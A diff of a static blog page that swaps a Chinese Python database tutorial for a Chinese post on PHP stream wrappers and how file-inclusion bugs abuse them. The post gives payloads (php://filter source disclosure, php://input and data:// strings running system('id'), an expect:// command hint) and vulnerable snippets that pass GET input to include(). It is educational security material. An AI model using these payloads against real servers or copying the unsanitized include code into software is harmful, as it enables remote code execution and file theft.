@@ -4,32 +4,124 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>python数据库编程 | Hello_C技术博客</title>
+    <title>PHP伪协议 | Hello_C技术博客</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="Hello_C">
     
 
     
-    <meta name="description" content="0x01、Python数据库编程python标准数据库接口为python DB-API,它为我们提供了数据库应用编程接口，Python数据库接口及API可以查看详细的支持数据库列表。
-在没有使用DB-API之前，对于每个数据库操作我们都得首先使用对应的接口程序，再连接数据库,整个过程都是很麻烦的。">
+    <meta name="description" content="PHP协议/封装协议
+
+
+包装或协议
+控制能力
+allow_url_include
+漏洞类型
+备注
+
+
+
+
+file://
+-
+Off
+LFI /文件操作
+
+
+glob://
+-
+Off
+目录遍历
+
+
+php://filter/read
+include
+Off
+文件泄露
+PHP：//filter/read=convert.base64-encode/resource=index.php
+
+
+php">
 <meta property="og:type" content="article">
-<meta property="og:title" content="python数据库编程">
-<meta property="og:url" content="http://yoursite.com/代码/2016/11/02/python之数据库编程.html">
+<meta property="og:title" content="PHP伪协议">
+<meta property="og:url" content="http://yoursite.com/代码/2017/04/09/PHP伪协议.html">
 <meta property="og:site_name" content="Hello_C技术博客">
-<meta property="og:description" content="0x01、Python数据库编程python标准数据库接口为python DB-API,它为我们提供了数据库应用编程接口，Python数据库接口及API可以查看详细的支持数据库列表。
-在没有使用DB-API之前，对于每个数据库操作我们都得首先使用对应的接口程序，再连接数据库,整个过程都是很麻烦的。">
-<meta property="og:image" content="http://7xrn7f.com1.z0.glb.clouddn.com/16-11-2/99015254.jpg">
-<meta property="og:image" content="http://7xrn7f.com1.z0.glb.clouddn.com/16-11-2/49380868.jpg">
-<meta property="og:image" content="http://7xrn7f.com1.z0.glb.clouddn.com/16-11-2/14808792.jpg">
-<meta property="og:image" content="http://7xrn7f.com1.z0.glb.clouddn.com/16-11-2/18715050.jpg">
-<meta property="og:image" content="http://7xrn7f.com1.z0.glb.clouddn.com/16-11-2/13078060.jpg">
-<meta property="og:updated_time" content="2017-04-02T07:40:17.926Z">
+<meta property="og:description" content="PHP协议/封装协议
+
+
+包装或协议
+控制能力
+allow_url_include
+漏洞类型
+备注
+
+
+
+
+file://
+-
+Off
+LFI /文件操作
+
+
+glob://
+-
+Off
+目录遍历
+
+
+php://filter/read
+include
+Off
+文件泄露
+PHP：//filter/read=convert.base64-encode/resource=index.php
+
+
+php">
+<meta property="og:image" content="http://i4.buimg.com/567571/f0b778051856c477.jpg">
+<meta property="og:image" content="http://i4.buimg.com/567571/e62036bab64c514b.jpg">
+<meta property="og:image" content="http://i4.buimg.com/567571/caba05f9460d9dbe.jpg">
+<meta property="og:image" content="http://i4.buimg.com/567571/52bcb6ca96711975.jpg">
+<meta property="og:image" content="http://i4.buimg.com/567571/ab8f21052b4e2890.jpg">
+<meta property="og:image" content="http://i2.muimg.com/567571/f80e4710de9ee31d.jpg">
+<meta property="og:image" content="http://i4.buimg.com/567571/19570d7acea8b8a7.jpg">
+<meta property="og:updated_time" content="2017-04-09T05:07:41.995Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="python数据库编程">
-<meta name="twitter:description" content="0x01、Python数据库编程python标准数据库接口为python DB-API,它为我们提供了数据库应用编程接口，Python数据库接口及API可以查看详细的支持数据库列表。
-在没有使用DB-API之前，对于每个数据库操作我们都得首先使用对应的接口程序，再连接数据库,整个过程都是很麻烦的。">
-<meta name="twitter:image" content="http://7xrn7f.com1.z0.glb.clouddn.com/16-11-2/99015254.jpg">
+<meta name="twitter:title" content="PHP伪协议">
+<meta name="twitter:description" content="PHP协议/封装协议
+
+
+包装或协议
+控制能力
+allow_url_include
+漏洞类型
+备注
+
+
+
+
+file://
+-
+Off
+LFI /文件操作
+
+
+glob://
+-
+Off
+目录遍历
+
+
+php://filter/read
+include
+Off
+文件泄露
+PHP：//filter/read=convert.base64-encode/resource=index.php
+
+
+php">
+<meta name="twitter:image" content="http://i4.buimg.com/567571/f0b778051856c477.jpg">
 
     
     <link rel="alternative" href="/atom.xml" title="Hello_C技术博客" type="application/atom+xml">
@@ -90,14 +182,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/代码/2016/11/02/python之数据库编程.html" title="python数据库编程" itemprop="url">python数据库编程</a>
+      <a href="/代码/2017/04/09/PHP伪协议.html" title="PHP伪协议" itemprop="url">PHP伪协议</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="Hello_C" target="_blank" itemprop="author">Hello_C</a>
 		
   <p class="article-time">
-    <time datetime="2016-11-02T12:40:21.000Z" itemprop="datePublished"> 发表于 2016-11-02</time>
+    <time datetime="2017-04-09T04:38:31.000Z" itemprop="datePublished"> 发表于 2017-04-09</time>
     
   </p>
 </header>
@@ -106,74 +198,131 @@
 		<div id="toc" class="toc-article">
 			<strong class="toc-title">文章目录</strong>
 		
-			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01、Python数据库编程"><span class="toc-number">1.</span> <span class="toc-text">0x01、Python数据库编程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02、Python-DB-API使用流程"><span class="toc-number">2.</span> <span class="toc-text">0x02、Python DB-API使用流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03、数据库连接的基本操作"><span class="toc-number">3.</span> <span class="toc-text">0x03、数据库连接的基本操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04、举例操作"><span class="toc-number">4.</span> <span class="toc-text">0x04、举例操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05、爬虫与数据库结合"><span class="toc-number">5.</span> <span class="toc-text">0x05、爬虫与数据库结合</span></a></li></ol>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP协议-封装协议"><span class="toc-number">1.</span> <span class="toc-text">PHP协议/封装协议</span></a></li></ol>
 		
 		</div>
 		
-		<h3 id="0x01、Python数据库编程"><a href="#0x01、Python数据库编程" class="headerlink" title="0x01、Python数据库编程"></a>0x01、Python数据库编程</h3><p>python标准数据库接口为python DB-API,它为我们提供了数据库应用编程接口，<a href="https://wiki.python.org/moin/DatabaseInterfaces" target="_blank" rel="external">Python数据库接口及API</a>可以查看详细的支持数据库列表。</p>
-<p>在没有使用DB-API之前，对于每个数据库操作我们都得首先使用对应的接口程序，再连接数据库,整个过程都是很麻烦的。<br><a id="more"></a><br><img src="http://7xrn7f.com1.z0.glb.clouddn.com/16-11-2/99015254.jpg" alt=""><br>使用DB-API之后,我们可以快速的调用DB-API对数据库进行连接，快速方便<br><img src="http://7xrn7f.com1.z0.glb.clouddn.com/16-11-2/49380868.jpg" alt=""></p>
-<h3 id="0x02、Python-DB-API使用流程"><a href="#0x02、Python-DB-API使用流程" class="headerlink" title="0x02、Python DB-API使用流程"></a>0x02、Python DB-API使用流程</h3><p>1、引入API模块；<br>2、获取与数据库的连接；<br>3、执行SQL语句和存储过程<br>4、关闭数据库连接；<br><img src="http://7xrn7f.com1.z0.glb.clouddn.com/16-11-2/14808792.jpg" alt=""><br><img src="http://7xrn7f.com1.z0.glb.clouddn.com/16-11-2/18715050.jpg" alt=""></p>
-<p>这里我们使用mysql数据库进行连接<br>MySQLdb是用于python连接mysql的接口<br>安装MySQLdb，推荐大家先安装pip，这样我们以后安装其他库也就方便多了。<br>pip安装MySQLdb</p>
-<pre><code>pip install MySQL-python
-</code></pre><p><a href="http://www.jb51.net/article/48827.htm" target="_blank" rel="external">其他安装方法</a></p>
-<p>数据库的安装过程以及数据库的增删改查这里就不介绍了</p>
-<h3 id="0x03、数据库连接的基本操作"><a href="#0x03、数据库连接的基本操作" class="headerlink" title="0x03、数据库连接的基本操作"></a>0x03、数据库连接的基本操作</h3><pre><code>db = MySQLdb.connect(&quot;localhost&quot;,&quot;admin&quot;,&quot;123456&quot;,&quot;testdb&quot;)  #数据库连接
-cursor = db.cursor()  #使用cursor()获取操作游标
-cursor.execute(&quot;SELECT VERSION()&quot;)  #使用execute方法执行SQL操作
-data = cursor.fetchone()  #使用fetchone()方法获取一条数据库
-db.commit()   #提交到数据库执行
-cursor.close()   #关闭游标
-db.rollback()  #发生错误时回滚
-db.close()   #关闭数据库
-</code></pre><p><strong>对于支持事务的数据库， 在Python数据库编程中，当游标建立之时，就自动开始了一个隐形的数据库事务。<br>commit()方法游标的所有更新操作，rollback（）方法回滚当前游标的所有操作。每一个方法都开始了一个新的事务。</strong></p>
-<h3 id="0x04、举例操作"><a href="#0x04、举例操作" class="headerlink" title="0x04、举例操作"></a>0x04、举例操作</h3><pre><code>#！usr/bin/env python
-# -*- coding:utf-8 -*-
-
-import MySQLdb
-
-db = MySQLdb.Connect(&quot;localhost&quot;,&quot;admin&quot;,&quot;123456&quot;,&quot;test&quot;)
-cursor = db.cursor()
-
-sql = &quot;&quot;&quot;CREATE TABLE test (
-         NAME  CHAR(20),
-         AGE INT,
-         SEX CHAR(1))&quot;&quot;&quot;
-#sql = &quot;&quot;&quot;INSERT INTO test(NAME,AGE, SEX, INCOME)VALUES (&apos;Mac&apos;, 20, &apos;M&apos;)&quot;&quot;&quot;
-
-try:
-    cursor.executr(sql)
-    db.commit()
-except:
-    db.rollback()
-db.close()
-</code></pre><h3 id="0x05、爬虫与数据库结合"><a href="#0x05、爬虫与数据库结合" class="headerlink" title="0x05、爬虫与数据库结合"></a>0x05、爬虫与数据库结合</h3><p>当我们使用爬虫爬取到了一些信息，我们可以一边爬取一边存储到数据库中，这样也比较方便</p>
-<pre><code>#!/usr/bin/python
-# -*-coding:utf-8 -*-
-
-import MySQLdb
-import requests
-from bs4 import BeautifulSoup
-
-url = &apos;http://bbs.ichunqiu.com/portal.php&apos;
-r = requests.get(url=url)
-
-soup = BeautifulSoup(r.content,&apos;lxml&apos;)
-bbsnews = soup.find_all(name=&apos;a&apos;,attrs={&apos;class&apos;:&apos;ui_colorG&apos;})
-db = MySQLdb.Connect(&quot;localhost&quot;,&quot;root&quot;,&quot;&quot;,&quot;test&quot;,&quot;utf8&quot;)
-curcor = db.cursor()
-curcor.execute(&quot;CREATE TABLE xinxi (mingzi varchar(200))&quot;)
-count = 0
-for i in bbsnews:
-        curcor.execute(&quot;INSERT INTO xinxi (mingzi) VALUES (%s)&quot;,i)
-        count +=curcor.rowcount
-print(&apos;有%d行数据被插入&apos;%count)
-db.commit()
-curcor.close()
-db.close()
-</code></pre><p>这样我们就可以将我们爬取的想要的东西存储在了我们的数据库<br><img src="http://7xrn7f.com1.z0.glb.clouddn.com/16-11-2/13078060.jpg" alt=""></p>
-<p>还有就是存储内容汉字无法显示，<br>1、数据库my.ini把字段类型设置为utf8<a href="http://jingyan.baidu.com/article/e2284b2b675cf1e2e7118d4b.html" target="_blank" rel="external">连接</a>；<br>2、在连接数据库的时候，加个参数，说明数据库那边的字段类型一致，charset=’utf8’。</p>
-<pre><code>conn=MySQLdb.connect(host=&quot;127.0.0.1&quot;,user=&quot;nimei&quot;,passwd=&quot;nimei&quot;,db=&quot;nimei&quot;,charset=&quot;utf8&quot;) 
-</code></pre>  
+		<h3 id="PHP协议-封装协议"><a href="#PHP协议-封装协议" class="headerlink" title="PHP协议/封装协议"></a>PHP协议/封装协议</h3><table>
+<thead>
+<tr>
+<th>包装或协议</th>
+<th style="text-align:center">控制能力</th>
+<th style="text-align:right">allow_url_include</th>
+<th style="text-align:right">漏洞类型</th>
+<th style="text-align:right">备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>file://</td>
+<td style="text-align:center">-</td>
+<td style="text-align:right">Off</td>
+<td style="text-align:right">LFI /文件操作</td>
+</tr>
+<tr>
+<td>glob://</td>
+<td style="text-align:center">-</td>
+<td style="text-align:right">Off</td>
+<td style="text-align:right">目录遍历</td>
+</tr>
+<tr>
+<td>php://filter/read</td>
+<td style="text-align:center">include</td>
+<td style="text-align:right">Off</td>
+<td style="text-align:right">文件泄露</td>
+<td style="text-align:right">PHP：//filter/read=convert.base64-encode/resource=index.php</td>
+</tr>
+<tr>
+<td>php://filter/write</td>
+<td style="text-align:center">file_put_contents</td>
+<td style="text-align:right">Off</td>
+<td style="text-align:right">编码</td>
+<td style="text-align:right">file_put_contents(“php://filter/write=string.rot13/resource=x.txt”,”content”);</td>
+</tr>
+<tr>
+<td>php://input</td>
+<td style="text-align:center">include</td>
+<td style="text-align:right">On</td>
+<td style="text-align:right">RCE</td>
+<td style="text-align:right">Encoding is required while reading .php source: &lt;?php echo base64_encode(file_get_contents(“solution.php”));?&gt; OR just use &lt;?php system(‘cat x.php’);?&gt;</td>
+</tr>
+<tr>
+<td>data://</td>
+<td style="text-align:center">include</td>
+<td style="text-align:right">On</td>
+<td style="text-align:right">RCE</td>
+<td style="text-align:right">data:text/plain,&lt;?php system(“id”)?&gt; OR data:text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpPz4=</td>
+</tr>
+<tr>
+<td>zip://</td>
+<td style="text-align:center">include + uploaded file</td>
+<td style="text-align:right">Off</td>
+<td style="text-align:right">RCE</td>
+</tr>
+<tr>
+<td>phar://</td>
+<td style="text-align:center">include + uploaded file</td>
+<td style="text-align:right">Off</td>
+<td style="text-align:right">RCE</td>
+<td style="text-align:right">PHP版本&gt; = 5.3</td>
+</tr>
+</tbody>
+</table>
+<a id="more"></a>
+<p>php中支持的伪协议</p>
+<pre><code>file:// — 访问本地文件系统
+http:// — 访问 HTTP(s) 网址
+ftp:// — 访问 FTP(s) URLs
+php:// — 访问各个输入/输出流（I/O streams）
+zlib:// — 压缩流
+data:// — 数据（RFC 2397）
+glob:// — 查找匹配的文件路径模式
+phar:// — PHP 归档
+ssh2:// — Secure Shell 2
+rar:// — RAR
+ogg:// — 音频流
+expect:// — 处理交互式的流
+</code></pre><p>这里可以参考<a href="http://php.net/manual/zh/wrappers.php" target="_blank" rel="external">官方文档</a>进行查看。而遇见最多的也就是php://协议了：</p>
+<ul>
+<li>php://stdin<br>主要用于php cli的输入</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">while($line = fopen(&apos;php://stdin&apos;,&apos;r&apos;))&#123;  </div><div class="line">    echo fgets($line);  </div><div class="line">&#125;  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p><img src="http://i4.buimg.com/567571/f0b778051856c477.jpg" alt=""></p>
+<ul>
+<li>php://stdout<br>主要用于php cli的输入<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$fh = fopen(&apos;php://stdout&apos;, &apos;w&apos;);  </div><div class="line">fwrite($fh, &quot;标准输出php://stdout\n&quot;);  </div><div class="line">fclose($fh);  </div><div class="line">fwrite(STDOUT, &quot;标准输出STDOUT\n&quot;);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="http://i4.buimg.com/567571/e62036bab64c514b.jpg" alt=""></p>
+<ul>
+<li>php://input<br>可以读取到post没有解析的原始数据<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line"> echo file_get_contents($_GET[&quot;a&quot;]);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="http://i4.buimg.com/567571/caba05f9460d9dbe.jpg" alt=""><br>当php代码换成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$code = $_GET[&apos;a&apos;];  </div><div class="line">include($code);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>而且当php远程包含打开的时候（当allow_url_include=on),就可以造成任意代码执行。<br><img src="http://i4.buimg.com/567571/52bcb6ca96711975.jpg" alt=""></p>
+<ul>
+<li>php://output<br>是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line"> $code=$_GET[&quot;a&quot;];  </div><div class="line"> file_put_contents($code,&quot;test&quot;);   </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="http://i4.buimg.com/567571/ab8f21052b4e2890.jpg" alt=""></p>
+<ul>
+<li>php://filter<br>是一种元封装器， 设计用于数据流打开时的筛选过滤应用<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$filename=$_GET[&quot;a&quot;];  </div><div class="line">$data=&quot;test&quot;;  </div><div class="line">file_put_contents($filename, $data);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>?a=php://filter/write=string.tolower/resource=test.php<br>可以往服务器中写入一个文件内容全为小写且文件名为test.php的文件：<br>其中 ：<br>（1）string.tolower //写入内容全部变成小写<br>（2）string.toupper //写入内容全部变成大写<br>（3）string.rot13 //写入内容全部对字符串执行 ROT13 编码<br>通过：?a=php://filter/convert.base64-encode/resource=test.php<br>可以往服务器中写入一个文件内容为base64编码且文件名为test.php的文件<br><img src="http://i2.muimg.com/567571/f80e4710de9ee31d.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$filename=$_GET[&quot;a&quot;];  </div><div class="line">echo file_get_contents($filename);  </div><div class="line">?&gt; </div><div class="line"></div><div class="line">&lt;?php  </div><div class="line">$filename=$_GET[&quot;a&quot;]; </div><div class="line">include(&quot;$filename&quot;);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>?a=php://filter/convert.base64-encode/resource=test.php,就可以把test.php的内容以base64编码的方式显示出来</p>
+<p>双引号包含的变量$filename，可以当成正常变量执行，而单引号包裹的变量则会当成字符串</p>
+<ul>
+<li>expect://<br>可以用这个协议执行任意linux的指令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$code = $_GET[&apos;hax&apos;];  </div><div class="line">include($code);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>那么可以用?hax=expect://command 来执行任意linux指令，但是：<br>Note:该封装协议默认未开启<br>为了使用 expect:// 封装器，你必须安装» PECL 上的 » Expect扩展。</p>
+<ul>
+<li>data://<br>数据流封装器<br>当allow_url_include 打开的时候，任意文件包含就会成为任意命令执行<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php  </div><div class="line">$filename=$_GET[&quot;a&quot;];  </div><div class="line">include(&quot;$filename&quot;);  </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="http://i4.buimg.com/567571/19570d7acea8b8a7.jpg" alt=""></p>
+<p>参考链接：<br><a href="http://blog.csdn.net/niexinming/article/details/52605144" target="_blank" rel="external">http://blog.csdn.net/niexinming/article/details/52605144</a></p>
+  
 	</div>
 		<footer class="article-footer clearfix">
 <div class="article-catetags">
@@ -186,7 +335,7 @@ db.close()
 
   <div class="article-tags">
   
-  <span></span> <a href="/tags/python/">python</a>
+  <span></span> <a href="/tags/php/">php</a>
   </div>
 
 </div>
@@ -230,19 +379,11 @@ db.close()
 	
 <nav class="article-nav clearfix">
  
- <div class="prev" >
- <a href="/uncategorized/2016/11/03/python之图像处理.html" title="python之图像处理">
-  <strong>上一篇：</strong><br/>
-  <span>
-  python之图像处理</span>
-</a>
-</div>
-
 
 <div class="next">
-<a href="/漏洞/2016/11/02/文件上传.html"  title="文件上传">
+<a href="/测试/2017/04/03/PhpMyadmin分析（二）.html"  title="PhpMyadmin分析（二）">
  <strong>下一篇：</strong><br/> 
- <span>文件上传
+ <span>PhpMyadmin分析（二）
 </span>
 </a>
 </div>
@@ -251,7 +392,7 @@ db.close()
 
 	
 <section id="comments" class="comment">
-	<div class="ds-thread" data-thread-key="代码/2016/11/02/python之数据库编程.html" data-title="python数据库编程" data-url="http://yoursite.com/代码/2016/11/02/python之数据库编程.html"></div>
+	<div class="ds-thread" data-thread-key="代码/2017/04/09/PHP伪协议.html" data-title="PHP伪协议" data-url="http://yoursite.com/代码/2017/04/09/PHP伪协议.html"></div>
 </section>
 
 
@@ -261,7 +402,7 @@ db.close()
   <div id="toc" class="toc-aside">
   <strong class="toc-title">文章目录</strong>
  
- <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01、Python数据库编程"><span class="toc-number">1.</span> <span class="toc-text">0x01、Python数据库编程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02、Python-DB-API使用流程"><span class="toc-number">2.</span> <span class="toc-text">0x02、Python DB-API使用流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03、数据库连接的基本操作"><span class="toc-number">3.</span> <span class="toc-text">0x03、数据库连接的基本操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04、举例操作"><span class="toc-number">4.</span> <span class="toc-text">0x04、举例操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05、爬虫与数据库结合"><span class="toc-number">5.</span> <span class="toc-text">0x05、爬虫与数据库结合</span></a></li></ol>
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP协议-封装协议"><span class="toc-number">1.</span> <span class="toc-text">PHP协议/封装协议</span></a></li></ol>
  
   </div>
 
